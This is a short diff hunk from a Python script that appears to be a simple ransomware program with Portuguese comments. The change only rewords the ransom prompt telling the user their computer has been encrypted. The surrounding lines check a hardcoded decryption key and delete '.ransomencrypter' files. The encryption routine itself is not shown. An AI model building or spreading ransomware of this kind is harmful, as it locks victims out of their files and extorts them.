@@ -66,7 +66,7 @@ def descrypt(decrypt_file):
 if __name__ == '__main__': #conceito da variável __name__, com uma condição que verifica se essa variável é igual a ’__main__’, o que há é apenas uma verificação de se o programa está sendo executado por si só.
     criptografando()
     if criptografando:
-        key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
+        key = input('Seu computador foi criptografado :p, informe a chave  para liberar os arquivos:')
         if key == 'lkghpryvxzkjfdtc':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
             descrypt(key)
             for del_file in glob.glob('*.ransomencrypter'):
